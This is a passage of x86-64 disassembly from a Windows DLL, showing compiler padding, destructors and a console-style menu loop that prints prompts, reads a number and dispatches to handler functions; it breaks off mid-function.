   180001d19:	cc                   	int3
   180001d1a:	cc                   	int3
   180001d1b:	cc                   	int3
   180001d1c:	cc                   	int3
   180001d1d:	cc                   	int3
   180001d1e:	cc                   	int3
   180001d1f:	cc                   	int3
   180001d20:	0f b6 c2             	movzbl %dl,%eax
   180001d23:	c3                   	ret
   180001d24:	cc                   	int3
   180001d25:	cc                   	int3
   180001d26:	cc                   	int3
   180001d27:	cc                   	int3
   180001d28:	cc                   	int3
   180001d29:	cc                   	int3
   180001d2a:	cc                   	int3
   180001d2b:	cc                   	int3
   180001d2c:	cc                   	int3
   180001d2d:	cc                   	int3
   180001d2e:	cc                   	int3
   180001d2f:	cc                   	int3
   180001d30:	40 53                	rex push %rbx
   180001d32:	48 83 ec 20          	sub    $0x20,%rsp
   180001d36:	49 8b d8             	mov    %r8,%rbx
   180001d39:	49 8b c9             	mov    %r9,%rcx
   180001d3c:	4c 2b c2             	sub    %rdx,%r8
   180001d3f:	e8 5c 7b 01 00       	call   0x1800198a0
   180001d44:	48 8b c3             	mov    %rbx,%rax
   180001d47:	48 83 c4 20          	add    $0x20,%rsp
   180001d4b:	5b                   	pop    %rbx
   180001d4c:	c3                   	ret
   180001d4d:	cc                   	int3
   180001d4e:	cc                   	int3
   180001d4f:	cc                   	int3
   180001d50:	40 53                	rex push %rbx
   180001d52:	48 83 ec 20          	sub    $0x20,%rsp
   180001d56:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   180001d5b:	49 8b d8             	mov    %r8,%rbx
   180001d5e:	4c 2b c2             	sub    %rdx,%r8
   180001d61:	e8 3a 7b 01 00       	call   0x1800198a0
   180001d66:	48 8b c3             	mov    %rbx,%rax
   180001d69:	48 83 c4 20          	add    $0x20,%rsp
   180001d6d:	5b                   	pop    %rbx
   180001d6e:	c3                   	ret
   180001d6f:	cc                   	int3
   180001d70:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001d75:	57                   	push   %rdi
   180001d76:	48 83 ec 20          	sub    $0x20,%rsp
   180001d7a:	48 8d 05 3f f7 03 00 	lea    0x3f73f(%rip),%rax        # 0x1800414c0
   180001d81:	8b fa                	mov    %edx,%edi
   180001d83:	48 89 01             	mov    %rax,(%rcx)
   180001d86:	48 8b d9             	mov    %rcx,%rbx
   180001d89:	8b 41 20             	mov    0x20(%rcx),%eax
   180001d8c:	85 c0                	test   %eax,%eax
   180001d8e:	7e 0b                	jle    0x180001d9b
   180001d90:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   180001d94:	e8 1f e5 01 00       	call   0x1800202b8
   180001d99:	eb 0b                	jmp    0x180001da6
   180001d9b:	79 09                	jns    0x180001da6
   180001d9d:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   180001da1:	e8 8a 5b 01 00       	call   0x180017930
   180001da6:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   180001daa:	e8 09 e5 01 00       	call   0x1800202b8
   180001daf:	48 8d 05 22 f6 03 00 	lea    0x3f622(%rip),%rax        # 0x1800413d8
   180001db6:	48 89 03             	mov    %rax,(%rbx)
   180001db9:	40 f6 c7 01          	test   $0x1,%dil
   180001dbd:	74 0d                	je     0x180001dcc
   180001dbf:	ba 30 00 00 00       	mov    $0x30,%edx
   180001dc4:	48 8b cb             	mov    %rbx,%rcx
   180001dc7:	e8 64 5b 01 00       	call   0x180017930
   180001dcc:	48 8b c3             	mov    %rbx,%rax
   180001dcf:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001dd4:	48 83 c4 20          	add    $0x20,%rsp
   180001dd8:	5f                   	pop    %rdi
   180001dd9:	c3                   	ret
   180001dda:	cc                   	int3
   180001ddb:	cc                   	int3
   180001ddc:	cc                   	int3
   180001ddd:	cc                   	int3
   180001dde:	cc                   	int3
   180001ddf:	cc                   	int3
   180001de0:	40 53                	rex push %rbx
   180001de2:	48 83 ec 60          	sub    $0x60,%rsp
   180001de6:	0f 29 74 24 50       	movaps %xmm6,0x50(%rsp)
   180001deb:	48 8b d9             	mov    %rcx,%rbx
   180001dee:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   180001df3:	41 0f 10 30          	movups (%r8),%xmm6
   180001df7:	33 c0                	xor    %eax,%eax
   180001df9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180001dfe:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180001e03:	48 c7 44 24 38 0f 00 	movq   $0xf,0x38(%rsp)
   180001e0a:	00 00 
   180001e0c:	88 44 24 20          	mov    %al,0x20(%rsp)
   180001e10:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   180001e17:	49 ff c0             	inc    %r8
   180001e1a:	42 38 04 02          	cmp    %al,(%rdx,%r8,1)
   180001e1e:	75 f7                	jne    0x180001e17
   180001e20:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001e25:	e8 76 ba 00 00       	call   0x18000d8a0
   180001e2a:	90                   	nop
   180001e2b:	66 0f 7f 74 24 40    	movdqa %xmm6,0x40(%rsp)
   180001e31:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   180001e36:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   180001e3b:	48 8b cb             	mov    %rbx,%rcx
   180001e3e:	e8 4d f7 ff ff       	call   0x180001590
   180001e43:	90                   	nop
   180001e44:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   180001e49:	48 83 fa 10          	cmp    $0x10,%rdx
   180001e4d:	72 2e                	jb     0x180001e7d
   180001e4f:	48 ff c2             	inc    %rdx
   180001e52:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   180001e57:	48 8b c1             	mov    %rcx,%rax
   180001e5a:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180001e61:	72 15                	jb     0x180001e78
   180001e63:	48 83 c2 27          	add    $0x27,%rdx
   180001e67:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   180001e6b:	48 2b c1             	sub    %rcx,%rax
   180001e6e:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180001e72:	48 83 f8 1f          	cmp    $0x1f,%rax
   180001e76:	77 1d                	ja     0x180001e95
   180001e78:	e8 b3 5a 01 00       	call   0x180017930
   180001e7d:	48 8d 05 9c f6 03 00 	lea    0x3f69c(%rip),%rax        # 0x180041520
   180001e84:	48 89 03             	mov    %rax,(%rbx)
   180001e87:	48 8b c3             	mov    %rbx,%rax
   180001e8a:	0f 28 74 24 50       	movaps 0x50(%rsp),%xmm6
   180001e8f:	48 83 c4 60          	add    $0x60,%rsp
   180001e93:	5b                   	pop    %rbx
   180001e94:	c3                   	ret
   180001e95:	e8 66 e6 01 00       	call   0x180020500
   180001e9a:	cc                   	int3
   180001e9b:	cc                   	int3
   180001e9c:	cc                   	int3
   180001e9d:	cc                   	int3
   180001e9e:	cc                   	int3
   180001e9f:	cc                   	int3
   180001ea0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001ea5:	57                   	push   %rdi
   180001ea6:	48 83 ec 20          	sub    $0x20,%rsp
   180001eaa:	48 8b da             	mov    %rdx,%rbx
   180001ead:	48 8d 05 64 e6 03 00 	lea    0x3e664(%rip),%rax        # 0x180040518
   180001eb4:	48 89 01             	mov    %rax,(%rcx)
   180001eb7:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   180001ebb:	48 8b f9             	mov    %rcx,%rdi
   180001ebe:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001ec1:	0f 11 02             	movups %xmm0,(%rdx)
   180001ec4:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   180001ec8:	e8 1f 78 01 00       	call   0x1800196ec
   180001ecd:	48 8d 05 6c f5 03 00 	lea    0x3f56c(%rip),%rax        # 0x180041440
   180001ed4:	48 89 07             	mov    %rax,(%rdi)
   180001ed7:	48 8d 05 42 f6 03 00 	lea    0x3f642(%rip),%rax        # 0x180041520
   180001ede:	0f 10 43 18          	movups 0x18(%rbx),%xmm0
   180001ee2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001ee7:	48 89 07             	mov    %rax,(%rdi)
   180001eea:	48 8b c7             	mov    %rdi,%rax
   180001eed:	0f 11 47 18          	movups %xmm0,0x18(%rdi)
   180001ef1:	48 83 c4 20          	add    $0x20,%rsp
   180001ef5:	5f                   	pop    %rdi
   180001ef6:	c3                   	ret
   180001ef7:	cc                   	int3
   180001ef8:	cc                   	int3
   180001ef9:	cc                   	int3
   180001efa:	cc                   	int3
   180001efb:	cc                   	int3
   180001efc:	cc                   	int3
   180001efd:	cc                   	int3
   180001efe:	cc                   	int3
   180001eff:	cc                   	int3
   180001f00:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001f05:	57                   	push   %rdi
   180001f06:	48 83 ec 20          	sub    $0x20,%rsp
   180001f0a:	8b da                	mov    %edx,%ebx
   180001f0c:	48 8b f9             	mov    %rcx,%rdi
   180001f0f:	48 8d 05 22 f6 03 00 	lea    0x3f622(%rip),%rax        # 0x180041538
   180001f16:	48 89 01             	mov    %rax,(%rcx)
   180001f19:	e8 d2 4e 01 00       	call   0x180016df0
   180001f1e:	90                   	nop
   180001f1f:	f6 c3 01             	test   $0x1,%bl
   180001f22:	74 0d                	je     0x180001f31
   180001f24:	ba 48 00 00 00       	mov    $0x48,%edx
   180001f29:	48 8b cf             	mov    %rdi,%rcx
   180001f2c:	e8 ff 59 01 00       	call   0x180017930
   180001f31:	48 8b c7             	mov    %rdi,%rax
   180001f34:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001f39:	48 83 c4 20          	add    $0x20,%rsp
   180001f3d:	5f                   	pop    %rdi
   180001f3e:	c3                   	ret
   180001f3f:	cc                   	int3
   180001f40:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180001f45:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   180001f4a:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180001f4f:	57                   	push   %rdi
   180001f50:	48 83 ec 30          	sub    $0x30,%rsp
   180001f54:	48 8b 05 fd 50 05 00 	mov    0x550fd(%rip),%rax        # 0x180057058
   180001f5b:	48 33 c4             	xor    %rsp,%rax
   180001f5e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180001f63:	8b 6c 24 20          	mov    0x20(%rsp),%ebp
   180001f67:	48 8b d9             	mov    %rcx,%rbx
   180001f6a:	8b 7c 24 20          	mov    0x20(%rsp),%edi
   180001f6e:	33 f6                	xor    %esi,%esi
   180001f70:	48 8d 15 a1 d3 04 00 	lea    0x4d3a1(%rip),%rdx        # 0x18004f318
   180001f77:	48 8d 0d 72 67 05 00 	lea    0x56772(%rip),%rcx        # 0x1800586f0
   180001f7e:	e8 7d d3 00 00       	call   0x18000f300
   180001f83:	48 8d 15 1e d3 04 00 	lea    0x4d31e(%rip),%rdx        # 0x18004f2a8
   180001f8a:	48 8d 0d 5f 67 05 00 	lea    0x5675f(%rip),%rcx        # 0x1800586f0
   180001f91:	e8 6a d3 00 00       	call   0x18000f300
   180001f96:	48 8d 15 93 d3 04 00 	lea    0x4d393(%rip),%rdx        # 0x18004f330
   180001f9d:	48 8d 0d 4c 67 05 00 	lea    0x5674c(%rip),%rcx        # 0x1800586f0
   180001fa4:	e8 57 d3 00 00       	call   0x18000f300
   180001fa9:	48 8d 15 98 d3 04 00 	lea    0x4d398(%rip),%rdx        # 0x18004f348
   180001fb0:	48 8d 0d 39 67 05 00 	lea    0x56739(%rip),%rcx        # 0x1800586f0
   180001fb7:	e8 44 d3 00 00       	call   0x18000f300
   180001fbc:	48 8d 15 6d d3 04 00 	lea    0x4d36d(%rip),%rdx        # 0x18004f330
   180001fc3:	48 8d 0d 26 67 05 00 	lea    0x56726(%rip),%rcx        # 0x1800586f0
   180001fca:	e8 31 d3 00 00       	call   0x18000f300
   180001fcf:	48 8d 15 42 d3 04 00 	lea    0x4d342(%rip),%rdx        # 0x18004f318
   180001fd6:	48 8d 0d 13 67 05 00 	lea    0x56713(%rip),%rcx        # 0x1800586f0
   180001fdd:	e8 1e d3 00 00       	call   0x18000f300
   180001fe2:	48 8d 15 bf d2 04 00 	lea    0x4d2bf(%rip),%rdx        # 0x18004f2a8
   180001fe9:	48 8d 0d 00 67 05 00 	lea    0x56700(%rip),%rcx        # 0x1800586f0
   180001ff0:	e8 0b d3 00 00       	call   0x18000f300
   180001ff5:	48 8d 15 a4 d3 04 00 	lea    0x4d3a4(%rip),%rdx        # 0x18004f3a0
   180001ffc:	48 8d 0d ed 66 05 00 	lea    0x566ed(%rip),%rcx        # 0x1800586f0
   180002003:	e8 f8 d2 00 00       	call   0x18000f300
   180002008:	48 8d 15 a9 d3 04 00 	lea    0x4d3a9(%rip),%rdx        # 0x18004f3b8
   18000200f:	48 8d 0d da 66 05 00 	lea    0x566da(%rip),%rcx        # 0x1800586f0
   180002016:	e8 e5 d2 00 00       	call   0x18000f300
   18000201b:	48 8d 15 7e d3 04 00 	lea    0x4d37e(%rip),%rdx        # 0x18004f3a0
   180002022:	48 8d 0d c7 66 05 00 	lea    0x566c7(%rip),%rcx        # 0x1800586f0
   180002029:	e8 d2 d2 00 00       	call   0x18000f300
   18000202e:	48 8d 15 9b d3 04 00 	lea    0x4d39b(%rip),%rdx        # 0x18004f3d0
   180002035:	48 8d 0d b4 66 05 00 	lea    0x566b4(%rip),%rcx        # 0x1800586f0
   18000203c:	e8 bf d2 00 00       	call   0x18000f300
   180002041:	48 8d 15 a0 d3 04 00 	lea    0x4d3a0(%rip),%rdx        # 0x18004f3e8
   180002048:	48 8d 0d a1 66 05 00 	lea    0x566a1(%rip),%rcx        # 0x1800586f0
   18000204f:	e8 ac d2 00 00       	call   0x18000f300
   180002054:	48 8d 15 a5 d3 04 00 	lea    0x4d3a5(%rip),%rdx        # 0x18004f400
   18000205b:	48 8d 0d 8e 66 05 00 	lea    0x5668e(%rip),%rcx        # 0x1800586f0
   180002062:	e8 99 d2 00 00       	call   0x18000f300
   180002067:	48 8d 15 aa d3 04 00 	lea    0x4d3aa(%rip),%rdx        # 0x18004f418
   18000206e:	48 8d 0d 7b 66 05 00 	lea    0x5667b(%rip),%rcx        # 0x1800586f0
   180002075:	e8 86 d2 00 00       	call   0x18000f300
   18000207a:	48 8d 15 af d3 04 00 	lea    0x4d3af(%rip),%rdx        # 0x18004f430
   180002081:	48 8d 0d 68 66 05 00 	lea    0x56668(%rip),%rcx        # 0x1800586f0
   180002088:	e8 73 d2 00 00       	call   0x18000f300
   18000208d:	48 8d 15 ac d3 04 00 	lea    0x4d3ac(%rip),%rdx        # 0x18004f440
   180002094:	48 8d 0d 55 66 05 00 	lea    0x56655(%rip),%rcx        # 0x1800586f0
   18000209b:	e8 60 d2 00 00       	call   0x18000f300
   1800020a0:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1800020a5:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1800020a9:	e8 42 db 00 00       	call   0x18000fbf0
   1800020ae:	8b 74 24 20          	mov    0x20(%rsp),%esi
   1800020b2:	8b c6                	mov    %esi,%eax
   1800020b4:	83 e8 01             	sub    $0x1,%eax
   1800020b7:	0f 84 80 02 00 00    	je     0x18000233d
   1800020bd:	83 e8 01             	sub    $0x1,%eax
   1800020c0:	0f 84 6a 02 00 00    	je     0x180002330
   1800020c6:	83 e8 01             	sub    $0x1,%eax
   1800020c9:	0f 84 54 02 00 00    	je     0x180002323
   1800020cf:	83 e8 01             	sub    $0x1,%eax
   1800020d2:	74 5b                	je     0x18000212f
   1800020d4:	83 f8 01             	cmp    $0x1,%eax
   1800020d7:	74 34                	je     0x18000210d
   1800020d9:	48 8d 15 80 d3 04 00 	lea    0x4d380(%rip),%rdx        # 0x18004f460
   1800020e0:	48 8d 0d 09 66 05 00 	lea    0x56609(%rip),%rcx        # 0x1800586f0
   1800020e7:	e8 14 d2 00 00       	call   0x18000f300
   1800020ec:	48 8d 15 8d d3 04 00 	lea    0x4d38d(%rip),%rdx        # 0x18004f480
   1800020f3:	48 8d 0d f6 65 05 00 	lea    0x565f6(%rip),%rcx        # 0x1800586f0
   1800020fa:	e8 01 d2 00 00       	call   0x18000f300
   1800020ff:	e8 68 23 02 00       	call   0x18002446c
   180002104:	83 fe 05             	cmp    $0x5,%esi
   180002107:	0f 85 63 fe ff ff    	jne    0x180001f70
   18000210d:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180002112:	48 33 cc             	xor    %rsp,%rcx
   180002115:	e8 f6 57 01 00       	call   0x180017910
   18000211a:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   18000211f:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   180002124:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   180002129:	48 83 c4 30          	add    $0x30,%rsp
   18000212d:	5f                   	pop    %rdi
   18000212e:	c3                   	ret
   18000212f:	48 8d 15 e2 d1 04 00 	lea    0x4d1e2(%rip),%rdx        # 0x18004f318
   180002136:	48 8d 0d b3 65 05 00 	lea    0x565b3(%rip),%rcx        # 0x1800586f0
   18000213d:	e8 be d1 00 00       	call   0x18000f300
   180002142:	48 8d 15 5f d1 04 00 	lea    0x4d15f(%rip),%rdx        # 0x18004f2a8
   180002149:	48 8d 0d a0 65 05 00 	lea    0x565a0(%rip),%rcx        # 0x1800586f0
   180002150:	e8 ab d1 00 00       	call   0x18000f300
   180002155:	48 8d 15 d4 d1 04 00 	lea    0x4d1d4(%rip),%rdx        # 0x18004f330
   18000215c:	48 8d 0d 8d 65 05 00 	lea    0x5658d(%rip),%rcx        # 0x1800586f0
   180002163:	e8 98 d1 00 00       	call   0x18000f300
   180002168:	48 8d 15 d9 d1 04 00 	lea    0x4d1d9(%rip),%rdx        # 0x18004f348
   18000216f:	48 8d 0d 7a 65 05 00 	lea    0x5657a(%rip),%rcx        # 0x1800586f0
   180002176:	e8 85 d1 00 00       	call   0x18000f300
   18000217b:	48 8d 15 ae d1 04 00 	lea    0x4d1ae(%rip),%rdx        # 0x18004f330
   180002182:	48 8d 0d 67 65 05 00 	lea    0x56567(%rip),%rcx        # 0x1800586f0
   180002189:	e8 72 d1 00 00       	call   0x18000f300
   18000218e:	48 8d 15 83 d1 04 00 	lea    0x4d183(%rip),%rdx        # 0x18004f318
   180002195:	48 8d 0d 54 65 05 00 	lea    0x56554(%rip),%rcx        # 0x1800586f0
   18000219c:	e8 5f d1 00 00       	call   0x18000f300
   1800021a1:	48 8d 15 00 d1 04 00 	lea    0x4d100(%rip),%rdx        # 0x18004f2a8
   1800021a8:	48 8d 0d 41 65 05 00 	lea    0x56541(%rip),%rcx        # 0x1800586f0
   1800021af:	e8 4c d1 00 00       	call   0x18000f300
   1800021b4:	48 8d 15 ad d5 04 00 	lea    0x4d5ad(%rip),%rdx        # 0x18004f768
   1800021bb:	48 8d 0d 2e 65 05 00 	lea    0x5652e(%rip),%rcx        # 0x1800586f0
   1800021c2:	e8 39 d1 00 00       	call   0x18000f300
   1800021c7:	48 8d 15 aa d5 04 00 	lea    0x4d5aa(%rip),%rdx        # 0x18004f778
   1800021ce:	48 8d 0d 1b 65 05 00 	lea    0x5651b(%rip),%rcx        # 0x1800586f0
   1800021d5:	e8 26 d1 00 00       	call   0x18000f300
   1800021da:	48 8d 15 a7 d5 04 00 	lea    0x4d5a7(%rip),%rdx        # 0x18004f788
   1800021e1:	48 8d 0d 08 65 05 00 	lea    0x56508(%rip),%rcx        # 0x1800586f0
   1800021e8:	e8 13 d1 00 00       	call   0x18000f300
   1800021ed:	48 8d 15 b4 d5 04 00 	lea    0x4d5b4(%rip),%rdx        # 0x18004f7a8
   1800021f4:	48 8d 0d f5 64 05 00 	lea    0x564f5(%rip),%rcx        # 0x1800586f0
   1800021fb:	e8 00 d1 00 00       	call   0x18000f300
   180002200:	48 8d 15 c1 d5 04 00 	lea    0x4d5c1(%rip),%rdx        # 0x18004f7c8
   180002207:	48 8d 0d e2 64 05 00 	lea    0x564e2(%rip),%rcx        # 0x1800586f0
   18000220e:	e8 ed d0 00 00       	call   0x18000f300
   180002213:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   180002218:	89 6c 24 20          	mov    %ebp,0x20(%rsp)
   18000221c:	e8 cf d9 00 00       	call   0x18000fbf0
   180002221:	8b 6c 24 20          	mov    0x20(%rsp),%ebp
   180002225:	48 8d 15 ec d0 04 00 	lea    0x4d0ec(%rip),%rdx        # 0x18004f318
   18000222c:	48 8d 0d bd 64 05 00 	lea    0x564bd(%rip),%rcx        # 0x1800586f0
   180002233:	e8 c8 d0 00 00       	call   0x18000f300
   180002238:	48 8d 15 69 d0 04 00 	lea    0x4d069(%rip),%rdx        # 0x18004f2a8
   18000223f:	48 8d 0d aa 64 05 00 	lea    0x564aa(%rip),%rcx        # 0x1800586f0
   180002246:	e8 b5 d0 00 00       	call   0x18000f300
   18000224b:	48 8d 15 de d0 04 00 	lea    0x4d0de(%rip),%rdx        # 0x18004f330
   180002252:	48 8d 0d 97 64 05 00 	lea    0x56497(%rip),%rcx        # 0x1800586f0
   180002259:	e8 a2 d0 00 00       	call   0x18000f300
   18000225e:	48 8d 15 e3 d0 04 00 	lea    0x4d0e3(%rip),%rdx        # 0x18004f348
   180002265:	48 8d 0d 84 64 05 00 	lea    0x56484(%rip),%rcx        # 0x1800586f0
   18000226c:	e8 8f d0 00 00       	call   0x18000f300
   180002271:	48 8d 15 b8 d0 04 00 	lea    0x4d0b8(%rip),%rdx        # 0x18004f330
   180002278:	48 8d 0d 71 64 05 00 	lea    0x56471(%rip),%rcx        # 0x1800586f0
   18000227f:	e8 7c d0 00 00       	call   0x18000f300
   180002284:	48 8d 15 8d d0 04 00 	lea    0x4d08d(%rip),%rdx        # 0x18004f318
   18000228b:	48 8d 0d 5e 64 05 00 	lea    0x5645e(%rip),%rcx        # 0x1800586f0
   180002292:	e8 69 d0 00 00       	call   0x18000f300
   180002297:	48 8d 15 0a d0 04 00 	lea    0x4d00a(%rip),%rdx        # 0x18004f2a8
   18000229e:	48 8d 0d 4b 64 05 00 	lea    0x5644b(%rip),%rcx        # 0x1800586f0
   1800022a5:	e8 56 d0 00 00       	call   0x18000f300
   1800022aa:	48 8d 15 07 d3 04 00 	lea    0x4d307(%rip),%rdx        # 0x18004f5b8
   1800022b1:	48 8d 0d 38 64 05 00 	lea    0x56438(%rip),%rcx        # 0x1800586f0
   1800022b8:	e8 43 d0 00 00       	call   0x18000f300
   1800022bd:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1800022c2:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   1800022c6:	e8 25 d9 00 00       	call   0x18000fbf0
   1800022cb:	8b 7c 24 20          	mov    0x20(%rsp),%edi
   1800022cf:	8b cd                	mov    %ebp,%ecx
   1800022d1:	83 e9 01             	sub    $0x1,%ecx
   1800022d4:	74 26                	je     0x1800022fc
   1800022d6:	83 f9 01             	cmp    $0x1,%ecx
   1800022d9:	74 15                	je     0x1800022f0
   1800022db:	48 8d 15 fe d4 04 00 	lea    0x4d4fe(%rip),%rdx        # 0x18004f7e0
   1800022e2:	48 8d 0d 07 64 05 00 	lea    0x56407(%rip),%rcx        # 0x1800586f0
   1800022e9:	e8 12 d0 00 00       	call   0x18000f300
   1800022ee:	eb 16                	jmp    0x180002306
   1800022f0:	8b d7                	mov    %edi,%edx
   1800022f2:	48 8b cb             	mov    %rbx,%rcx
   1800022f5:	e8 a6 11 00 00       	call   0x1800034a0
   1800022fa:	eb 0a                	jmp    0x180002306
   1800022fc:	8b d7                	mov    %edi,%edx
   1800022fe:	48 8b cb             	mov    %rbx,%rcx
   180002301:	e8 ca 0d 00 00       	call   0x1800030d0
   180002306:	48 8d 15 eb d4 04 00 	lea    0x4d4eb(%rip),%rdx        # 0x18004f7f8
   18000230d:	48 8d 0d dc 63 05 00 	lea    0x563dc(%rip),%rcx        # 0x1800586f0
   180002314:	e8 e7 cf 00 00       	call   0x18000f300
   180002319:	e8 4e 21 02 00       	call   0x18002446c
   18000231e:	e9 4d fc ff ff       	jmp    0x180001f70
   180002323:	48 8b cb             	mov    %rbx,%rcx
   180002326:	e8 65 0a 00 00       	call   0x180002d90
   18000232b:	e9 40 fc ff ff       	jmp    0x180001f70
   180002330:	48 8b cb             	mov    %rbx,%rcx
   180002333:	e8 98 05 00 00       	call   0x1800028d0
   180002338:	e9 33 fc ff ff       	jmp    0x180001f70
   18000233d:	48 8b cb             	mov    %rbx,%rcx
   180002340:	e8 0b 00 00 00       	call   0x180002350
   180002345:	e9 26 fc ff ff       	jmp    0x180001f70
   18000234a:	cc                   	int3
   18000234b:	cc                   	int3
   18000234c:	cc                   	int3
   18000234d:	cc                   	int3
   18000234e:	cc                   	int3
   18000234f:	cc                   	int3
   180002350:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180002355:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000235a:	55                   	push   %rbp
   18000235b:	57                   	push   %rdi
   18000235c:	41 54                	push   %r12
   18000235e:	41 56                	push   %r14
   180002360:	41 57                	push   %r15
   180002362:	48 8d ac 24 50 fe ff 	lea    -0x1b0(%rsp),%rbp
   180002369:	ff 
   18000236a:	48 81 ec b0 02 00 00 	sub    $0x2b0,%rsp
   180002371:	48 8b 05 e0 4c 05 00 	mov    0x54ce0(%rip),%rax        # 0x180057058
   180002378:	48 33 c4             	xor    %rsp,%rax
   18000237b:	48 89 85 a0 01 00 00 	mov    %rax,0x1a0(%rbp)
   180002382:	48 8b d9             	mov    %rcx,%rbx
   180002385:	48 8d 15 8c cf 04 00 	lea    0x4cf8c(%rip),%rdx        # 0x18004f318
   18000238c:	48 8d 0d 5d 63 05 00 	lea    0x5635d(%rip),%rcx        # 0x1800586f0
   180002393:	e8 68 cf 00 00       	call   0x18000f300
   180002398:	48 8d 15 09 cf 04 00 	lea    0x4cf09(%rip),%rdx        # 0x18004f2a8
   18000239f:	48 8d 0d 4a 63 05 00 	lea    0x5634a(%rip),%rcx        # 0x1800586f0
   1800023a6:	e8 55 cf 00 00       	call   0x18000f300
   1800023ab:	48 8d 15 7e cf 04 00 	lea    0x4cf7e(%rip),%rdx        # 0x18004f330
   1800023b2:	48 8d 0d 37 63 05 00 	lea    0x56337(%rip),%rcx        # 0x1800586f0
   1800023b9:	e8 42 cf 00 00       	call   0x18000f300
   1800023be:	48 8d 15 83 cf 04 00 	lea    0x4cf83(%rip),%rdx        # 0x18004f348
   1800023c5:	48 8d 0d 24 63 05 00 	lea    0x56324(%rip),%rcx        # 0x1800586f0
   1800023cc:	e8 2f cf 00 00       	call   0x18000f300
   1800023d1:	48 8d 15 58 cf 04 00 	lea    0x4cf58(%rip),%rdx        # 0x18004f330
   1800023d8:	48 8d 0d 11 63 05 00 	lea    0x56311(%rip),%rcx        # 0x1800586f0
   1800023df:	e8 1c cf 00 00       	call   0x18000f300
   1800023e4:	48 8d 15 2d cf 04 00 	lea    0x4cf2d(%rip),%rdx        # 0x18004f318
   1800023eb:	48 8d 0d fe 62 05 00 	lea    0x562fe(%rip),%rcx        # 0x1800586f0
   1800023f2:	e8 09 cf 00 00       	call   0x18000f300
   1800023f7:	48 8d 15 aa ce 04 00 	lea    0x4ceaa(%rip),%rdx        # 0x18004f2a8
   1800023fe:	48 8d 0d eb 62 05 00 	lea    0x562eb(%rip),%rcx        # 0x1800586f0
   180002405:	e8 f6 ce 00 00       	call   0x18000f300
   18000240a:	33 d2                	xor    %edx,%edx
   18000240c:	41 b8 08 01 00 00    	mov    $0x108,%r8d
   180002412:	48 8d 8d 90 00 00 00 	lea    0x90(%rbp),%rcx
   180002419:	e8 32 7b 01 00       	call   0x180019f50
   18000241e:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   180002424:	48 8d 15 7d d0 04 00 	lea    0x4d07d(%rip),%rdx        # 0x18004f4a8
   18000242b:	48 8d 8d 90 00 00 00 	lea    0x90(%rbp),%rcx
   180002432:	e8 79 88 00 00       	call   0x18000acb0
   180002437:	90                   	nop
   180002438:	48 8d 15 79 d0 04 00 	lea    0x4d079(%rip),%rdx        # 0x18004f4b8
   18000243f:	48 8d 0d aa 62 05 00 	lea    0x562aa(%rip),%rcx        # 0x1800586f0
   180002446:	e8 b5 ce 00 00       	call   0x18000f300
   18000244b:	48 8d 15 86 d0 04 00 	lea    0x4d086(%rip),%rdx        # 0x18004f4d8
   180002452:	48 8d 0d 97 62 05 00 	lea    0x56297(%rip),%rcx        # 0x1800586f0
   180002459:	e8 a2 ce 00 00       	call   0x18000f300
   18000245e:	48 8d 15 93 d0 04 00 	lea    0x4d093(%rip),%rdx        # 0x18004f4f8
   180002465:	48 8d 0d 84 62 05 00 	lea    0x56284(%rip),%rcx        # 0x1800586f0
   18000246c:	e8 8f ce 00 00       	call   0x18000f300
   180002471:	8b 85 80 00 00 00    	mov    0x80(%rbp),%eax
   180002477:	89 85 80 00 00 00    	mov    %eax,0x80(%rbp)
   18000247d:	48 8d 95 80 00 00 00 	lea    0x80(%rbp),%rdx
   180002484:	e8 67 d7 00 00       	call   0x18000fbf0
   180002489:	45 33 f6             	xor    %r14d,%r14d
   18000248c:	33 d2                	xor    %edx,%edx
   18000248e:	41 b8 10 01 00 00    	mov    $0x110,%r8d
   180002494:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   180002499:	e8 b2 7a 01 00       	call   0x180019f50
   18000249e:	48 8d 15 03 d0 04 00 	lea    0x4d003(%rip),%rdx        # 0x18004f4a8
   1800024a5:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1800024aa:	e8 11 77 00 00       	call   0x180009bc0
   1800024af:	90                   	nop
   1800024b0:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
